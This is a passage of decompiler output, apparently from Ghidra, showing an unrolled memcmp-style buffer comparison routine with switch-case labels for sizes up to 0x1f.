        else {
          uVar1 = uVar1 & 0xff;
          uVar2 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x11));
          if ((uVar1 != uVar2) &&
             (iVar3 = (uint)(uVar1 != uVar2 && -1 < (int)(uVar1 - uVar2)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          uVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x10));
          uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x10));
          if ((uVar2 != uVar1) &&
             (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          uVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 0xf));
          uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 0xf));
          if ((uVar2 != uVar1) &&
             (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          iVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0xe)) -
                  (uint)*(byte *)((int)_Buf2 + (_Size - 0xe));
          if (iVar3 != 0) {
            iVar3 = (uint)(0 < iVar3) * 2 + -1;
          }
        }
        if (iVar3 != 0) {
          return iVar3;
        }
switchD_00417678_caseD_d:
        uVar1 = *(uint *)((int)_Buf1 + (_Size - 0xd));
        if (uVar1 == *(uint *)((int)_Buf2 + (_Size - 0xd))) {
          iVar3 = 0;
        }
        else {
          uVar1 = uVar1 & 0xff;
          uVar2 = (uint)*(byte *)((int)_Buf2 + (_Size - 0xd));
          if ((uVar1 != uVar2) &&
             (iVar3 = (uint)(uVar1 != uVar2 && -1 < (int)(uVar1 - uVar2)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          uVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 0xc));
          uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 0xc));
          if ((uVar2 != uVar1) &&
             (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          uVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 0xb));
          uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 0xb));
          if ((uVar2 != uVar1) &&
             (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          iVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 10)) -
                  (uint)*(byte *)((int)_Buf2 + (_Size - 10));
          if (iVar3 != 0) {
            iVar3 = (uint)(0 < iVar3) * 2 + -1;
          }
        }
        if (iVar3 != 0) {
          return iVar3;
        }
switchD_00417678_caseD_9:
        if (*(int *)((int)_Buf1 + (_Size - 9)) == *(int *)((int)_Buf2 + (_Size - 9))) {
          iVar3 = 0;
        }
        else {
          uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 9));
          uVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 9));
          if ((uVar2 != uVar1) &&
             (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          uVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 8));
          uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 8));
          if ((uVar2 != uVar1) &&
             (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          uVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 7));
          uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 7));
          if ((uVar2 != uVar1) &&
             (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          iVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 6)) -
                  (uint)*(byte *)((int)_Buf2 + (_Size - 6));
          if (iVar3 != 0) {
            iVar3 = (uint)(0 < iVar3) * 2 + -1;
          }
        }
        if (iVar3 != 0) {
          return iVar3;
        }
switchD_00417678_caseD_5:
        uVar1 = *(uint *)((int)_Buf1 + (_Size - 5));
        if (uVar1 == *(uint *)((int)_Buf2 + (_Size - 5))) {
          iVar3 = 0;
        }
        else {
          uVar1 = uVar1 & 0xff;
          uVar2 = (uint)*(byte *)((int)_Buf2 + (_Size - 5));
          if ((uVar1 != uVar2) &&
             (iVar3 = (uint)(uVar1 != uVar2 && -1 < (int)(uVar1 - uVar2)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          uVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 4));
          uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 4));
          if ((uVar2 != uVar1) &&
             (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          uVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 3));
          uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 3));
          if ((uVar2 != uVar1) &&
             (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          iVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 2)) -
                  (uint)*(byte *)((int)_Buf2 + (_Size - 2));
          if (iVar3 != 0) {
            iVar3 = (uint)(0 < iVar3) * 2 + -1;
          }
        }
joined_r0x00417e3e:
        if (iVar3 != 0) {
          return iVar3;
        }
switchD_00417678_caseD_1:
        uVar2 = (uint)*(byte *)((int)_Buf2 + (_Size - 1));
        uVar1 = (uint)*(byte *)((int)_Buf1 + (_Size - 1));
        if (uVar1 == uVar2) {
          return 0;
        }
        return (uint)(0 < (int)(uVar1 - uVar2)) * 2 + -1;
      case 0x1e:
        uVar1 = *(uint *)((int)_Buf1 + (_Size - 0x1e));
        if (uVar1 == *(uint *)((int)_Buf2 + (_Size - 0x1e))) {
          iVar3 = 0;
        }
        else {
          uVar1 = uVar1 & 0xff;
          uVar2 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x1e));
          if ((uVar1 != uVar2) &&
             (iVar3 = (uint)(uVar1 != uVar2 && -1 < (int)(uVar1 - uVar2)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          uVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x1d));
          uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x1d));
          if ((uVar2 != uVar1) &&
             (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          uVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x1c));
          uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x1c));
          if ((uVar2 != uVar1) &&
             (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          iVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x1b)) -
                  (uint)*(byte *)((int)_Buf2 + (_Size - 0x1b));
          if (iVar3 != 0) {
            iVar3 = (uint)(0 < iVar3) * 2 + -1;
          }
        }
        if (iVar3 != 0) {
          return iVar3;
        }
switchD_00417678_caseD_1a:
        uVar1 = *(uint *)((int)_Buf1 + (_Size - 0x1a));
        if (uVar1 == *(uint *)((int)_Buf2 + (_Size - 0x1a))) {
          iVar3 = 0;
        }
        else {
          uVar1 = uVar1 & 0xff;
          uVar2 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x1a));
          if ((uVar1 != uVar2) &&
             (iVar3 = (uint)(uVar1 != uVar2 && -1 < (int)(uVar1 - uVar2)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          uVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x19));
          uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x19));
          if ((uVar2 != uVar1) &&
             (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          uVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x18));
          uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x18));
          if ((uVar2 != uVar1) &&
             (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          iVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x17)) -
                  (uint)*(byte *)((int)_Buf2 + (_Size - 0x17));
          if (iVar3 != 0) {
            iVar3 = (uint)(0 < iVar3) * 2 + -1;
          }
        }
        if (iVar3 != 0) {
          return iVar3;
        }
switchD_00417678_caseD_16:
        uVar1 = *(uint *)((int)_Buf1 + (_Size - 0x16));
        if (uVar1 == *(uint *)((int)_Buf2 + (_Size - 0x16))) {
          iVar3 = 0;
        }
        else {
          uVar1 = uVar1 & 0xff;
          uVar2 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x16));
          if ((uVar1 != uVar2) &&
             (iVar3 = (uint)(uVar1 != uVar2 && -1 < (int)(uVar1 - uVar2)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          uVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x15));
          uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x15));
          if ((uVar2 != uVar1) &&
             (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          uVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x14));
          uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x14));
          if ((uVar2 != uVar1) &&
             (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          iVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x13)) -
                  (uint)*(byte *)((int)_Buf2 + (_Size - 0x13));
          if (iVar3 != 0) {
            iVar3 = (uint)(0 < iVar3) * 2 + -1;
          }
        }
        if (iVar3 != 0) {
          return iVar3;
        }
switchD_00417678_caseD_12:
        uVar1 = *(uint *)((int)_Buf1 + (_Size - 0x12));
        if (uVar1 == *(uint *)((int)_Buf2 + (_Size - 0x12))) {
          iVar3 = 0;
        }
        else {
          uVar1 = uVar1 & 0xff;
          uVar2 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x12));
          if ((uVar1 != uVar2) &&
             (iVar3 = (uint)(uVar1 != uVar2 && -1 < (int)(uVar1 - uVar2)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          uVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x11));
          uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x11));
          if ((uVar2 != uVar1) &&
             (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          uVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x10));
          uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x10));
          if ((uVar2 != uVar1) &&
             (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          iVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0xf)) -
                  (uint)*(byte *)((int)_Buf2 + (_Size - 0xf));
          if (iVar3 != 0) {
            iVar3 = (uint)(0 < iVar3) * 2 + -1;
          }
        }
        if (iVar3 != 0) {
          return iVar3;
        }
switchD_00417678_caseD_e:
        uVar1 = *(uint *)((int)_Buf1 + (_Size - 0xe));
        if (uVar1 == *(uint *)((int)_Buf2 + (_Size - 0xe))) {
          iVar3 = 0;
        }
        else {
          uVar1 = uVar1 & 0xff;
          uVar2 = (uint)*(byte *)((int)_Buf2 + (_Size - 0xe));
          if ((uVar1 != uVar2) &&
             (iVar3 = (uint)(uVar1 != uVar2 && -1 < (int)(uVar1 - uVar2)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          uVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 0xd));
          uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 0xd));
          if ((uVar2 != uVar1) &&
             (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          uVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 0xc));
          uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 0xc));
          if ((uVar2 != uVar1) &&
             (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          iVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0xb)) -
                  (uint)*(byte *)((int)_Buf2 + (_Size - 0xb));
          if (iVar3 != 0) {
            iVar3 = (uint)(0 < iVar3) * 2 + -1;
          }
        }
        if (iVar3 != 0) {
          return iVar3;
        }
switchD_00417678_caseD_a:
        if (*(int *)((int)_Buf1 + (_Size - 10)) == *(int *)((int)_Buf2 + (_Size - 10))) {
          iVar3 = 0;
        }
        else {
          uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 10));
          uVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 10));
          if ((uVar2 != uVar1) &&
             (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 9));
          uVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 9));
          if ((uVar2 != uVar1) &&
             (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 8));
          uVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 8));
          if ((uVar2 != uVar1) &&
             (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          iVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 7)) -
                  (uint)*(byte *)((int)_Buf2 + (_Size - 7));
          if (iVar3 != 0) {
            iVar3 = (uint)(0 < iVar3) * 2 + -1;
          }
        }
        if (iVar3 != 0) {
          return iVar3;
        }
switchD_00417678_caseD_6:
        uVar1 = *(uint *)((int)_Buf1 + (_Size - 6));
        if (uVar1 == *(uint *)((int)_Buf2 + (_Size - 6))) {
          iVar3 = 0;
        }
        else {
          uVar1 = uVar1 & 0xff;
          uVar2 = (uint)*(byte *)((int)_Buf2 + (_Size - 6));
          if ((uVar1 != uVar2) &&
             (iVar3 = (uint)(uVar1 != uVar2 && -1 < (int)(uVar1 - uVar2)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          uVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 5));
          uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 5));
          if ((uVar2 != uVar1) &&
             (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          uVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 4));
          uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 4));
          if ((uVar2 != uVar1) &&
             (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          iVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 3)) -
                  (uint)*(byte *)((int)_Buf2 + (_Size - 3));
          if (iVar3 != 0) {
            iVar3 = (uint)(0 < iVar3) * 2 + -1;
          }
        }
        if (iVar3 != 0) {
          return iVar3;
        }
switchD_00417678_caseD_2:
        if (*(short *)((int)_Buf1 + (_Size - 2)) != *(short *)((int)_Buf2 + (_Size - 2))) {
LAB_0041825e:
          uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 2));
          uVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 2));
          if (uVar2 == uVar1) goto switchD_00417678_caseD_1;
          iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1;
          goto joined_r0x00417e3e;
        }
        break;
      case 0x1f:
        if (*(int *)((int)_Buf1 + (_Size - 0x1f)) == *(int *)((int)_Buf2 + (_Size - 0x1f))) {
          iVar3 = 0;
        }
        else {
          uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x1f));
          uVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x1f));
          if ((uVar2 != uVar1) &&
             (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          uVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x1e));
          uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x1e));
          if ((uVar2 != uVar1) &&
             (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          uVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x1d));
          uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x1d));
          if ((uVar2 != uVar1) &&
             (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          iVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x1c)) -
                  (uint)*(byte *)((int)_Buf2 + (_Size - 0x1c));
          if (iVar3 != 0) {
            iVar3 = (uint)(0 < iVar3) * 2 + -1;
          }
        }
        if (iVar3 != 0) {
          return iVar3;
        }
switchD_00417678_caseD_1b:
        uVar1 = *(uint *)((int)_Buf1 + (_Size - 0x1b));
        if (uVar1 == *(uint *)((int)_Buf2 + (_Size - 0x1b))) {
          iVar3 = 0;
        }
        else {
          uVar1 = uVar1 & 0xff;
          uVar2 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x1b));
          if ((uVar1 != uVar2) &&
             (iVar3 = (uint)(uVar1 != uVar2 && -1 < (int)(uVar1 - uVar2)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          uVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x1a));
          uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x1a));
          if ((uVar2 != uVar1) &&
             (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          uVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x19));
          uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x19));
          if ((uVar2 != uVar1) &&
             (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          iVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x18)) -
                  (uint)*(byte *)((int)_Buf2 + (_Size - 0x18));
          if (iVar3 != 0) {
            iVar3 = (uint)(0 < iVar3) * 2 + -1;
          }
        }
        if (iVar3 != 0) {
          return iVar3;
        }
switchD_00417678_caseD_17:
        uVar1 = *(uint *)((int)_Buf1 + (_Size - 0x17));
        if (uVar1 == *(uint *)((int)_Buf2 + (_Size - 0x17))) {
          iVar3 = 0;
        }
        else {
          uVar1 = uVar1 & 0xff;
          uVar2 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x17));
          if ((uVar1 != uVar2) &&
             (iVar3 = (uint)(uVar1 != uVar2 && -1 < (int)(uVar1 - uVar2)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          uVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x16));
          uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x16));
          if ((uVar2 != uVar1) &&
             (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          uVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x15));
          uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x15));
          if ((uVar2 != uVar1) &&
             (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          iVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x14)) -
                  (uint)*(byte *)((int)_Buf2 + (_Size - 0x14));
          if (iVar3 != 0) {
            iVar3 = (uint)(0 < iVar3) * 2 + -1;
          }
        }
        if (iVar3 != 0) {
          return iVar3;
        }
switchD_00417678_caseD_13:
        uVar1 = *(uint *)((int)_Buf1 + (_Size - 0x13));
        if (uVar1 == *(uint *)((int)_Buf2 + (_Size - 0x13))) {
          iVar3 = 0;
        }
        else {
          uVar1 = uVar1 & 0xff;
          uVar2 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x13));
          if ((uVar1 != uVar2) &&
             (iVar3 = (uint)(uVar1 != uVar2 && -1 < (int)(uVar1 - uVar2)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          uVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x12));
          uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x12));
          if ((uVar2 != uVar1) &&
             (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          uVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x11));
          uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x11));
          if ((uVar2 != uVar1) &&
             (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          iVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x10)) -
                  (uint)*(byte *)((int)_Buf2 + (_Size - 0x10));
          if (iVar3 != 0) {
            iVar3 = (uint)(0 < iVar3) * 2 + -1;
          }
        }
        if (iVar3 != 0) {
          return iVar3;
        }
switchD_00417678_caseD_f:
        if (*(int *)((int)_Buf1 + (_Size - 0xf)) == *(int *)((int)_Buf2 + (_Size - 0xf))) {
          iVar3 = 0;
        }
        else {
          uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 0xf));
          uVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 0xf));
          if ((uVar2 != uVar1) &&
             (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          uVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 0xe));
          uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 0xe));
          if ((uVar2 != uVar1) &&
             (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          uVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 0xd));
          uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 0xd));
          if ((uVar2 != uVar1) &&
             (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          iVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0xc)) -
                  (uint)*(byte *)((int)_Buf2 + (_Size - 0xc));
          if (iVar3 != 0) {
            iVar3 = (uint)(0 < iVar3) * 2 + -1;
          }
        }
        if (iVar3 != 0) {
          return iVar3;
        }
switchD_00417678_caseD_b:
        uVar1 = *(uint *)((int)_Buf1 + (_Size - 0xb));
        if (uVar1 == *(uint *)((int)_Buf2 + (_Size - 0xb))) {
          iVar3 = 0;
        }
        else {
          uVar1 = uVar1 & 0xff;
          uVar2 = (uint)*(byte *)((int)_Buf2 + (_Size - 0xb));
          if ((uVar1 != uVar2) &&
             (iVar3 = (uint)(uVar1 != uVar2 && -1 < (int)(uVar1 - uVar2)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          uVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 10));
          uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 10));
          if ((uVar2 != uVar1) &&
             (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          uVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 9));
          uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 9));
          if ((uVar2 != uVar1) &&
             (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          iVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 8)) -
                  (uint)*(byte *)((int)_Buf2 + (_Size - 8));
          if (iVar3 != 0) {
            iVar3 = (uint)(0 < iVar3) * 2 + -1;
          }
        }
        if (iVar3 != 0) {
          return iVar3;
        }
switchD_00417678_caseD_7:
        uVar1 = *(uint *)((int)_Buf1 + (_Size - 7));
        if (uVar1 == *(uint *)((int)_Buf2 + (_Size - 7))) {
          iVar3 = 0;
        }
        else {
          uVar1 = uVar1 & 0xff;
          uVar2 = (uint)*(byte *)((int)_Buf2 + (_Size - 7));
          if ((uVar1 != uVar2) &&
             (iVar3 = (uint)(uVar1 != uVar2 && -1 < (int)(uVar1 - uVar2)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          uVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 6));
          uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 6));
          if ((uVar2 != uVar1) &&
             (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          uVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 5));
          uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 5));
          if ((uVar2 != uVar1) &&
             (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          iVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 4)) -
                  (uint)*(byte *)((int)_Buf2 + (_Size - 4));
          if (iVar3 != 0) {
            iVar3 = (uint)(0 < iVar3) * 2 + -1;
          }
        }
        if (iVar3 != 0) {
          return iVar3;
        }
switchD_00417678_caseD_3:
        uVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 3));
        uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 3));
        if ((uVar2 != uVar1) &&
           (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
          return iVar3;
        }
        goto LAB_0041825e;
      default:
        goto LAB_004171f1;
      }
      return 0;
    }
                    // WARNING: Load size is inaccurate
    uVar1 = (uint)*_Buf1;
                    // WARNING: Load size is inaccurate
    uVar2 = (uint)*_Buf2;
    if ((uVar1 != uVar2) &&
       (iVar3 = (uint)(uVar1 != uVar2 && -1 < (int)(uVar1 - uVar2)) * 2 + -1, iVar3 != 0)) {
      return iVar3;
    }
    uVar1 = (uint)*(byte *)((int)_Buf1 + 1);
    uVar2 = (uint)*(byte *)((int)_Buf2 + 1);
    if ((uVar1 != uVar2) &&
       (iVar3 = (uint)(uVar1 != uVar2 && -1 < (int)(uVar1 - uVar2)) * 2 + -1, iVar3 != 0)) {
      return iVar3;
    }
    uVar1 = (uint)*(byte *)((int)_Buf1 + 2);
    uVar2 = (uint)*(byte *)((int)_Buf2 + 2);
    if ((uVar1 != uVar2) &&
       (iVar3 = (uint)(uVar1 != uVar2 && -1 < (int)(uVar1 - uVar2)) * 2 + -1, iVar3 != 0)) {
      return iVar3;
    }
    uVar1 = (uint)*(byte *)((int)_Buf1 + 3);
    uVar2 = (uint)*(byte *)((int)_Buf2 + 3);
  }
  iVar3 = uVar1 - uVar2;
  if (iVar3 != 0) {
    iVar3 = (uint)(0 < iVar3) * 2 + -1;
  }
  return iVar3;
LAB_004171f1:
                    // WARNING: Load size is inaccurate
                    // WARNING: Load size is inaccurate
  if (*_Buf1 == *_Buf2) {
    iVar3 = 0;
  }
  else {
                    // WARNING: Load size is inaccurate
    uVar2 = (uint)*_Buf1;
                    // WARNING: Load size is inaccurate
    uVar1 = (uint)*_Buf2;
    if ((uVar2 != uVar1) &&
       (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
      return iVar3;
    }
    uVar2 = (uint)*(byte *)((int)_Buf1 + 1);
    uVar1 = (uint)*(byte *)((int)_Buf2 + 1);
    if ((uVar2 != uVar1) &&
       (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
      return iVar3;
    }
    uVar2 = (uint)*(byte *)((int)_Buf1 + 2);
    uVar1 = (uint)*(byte *)((int)_Buf2 + 2);
    if ((uVar2 != uVar1) &&
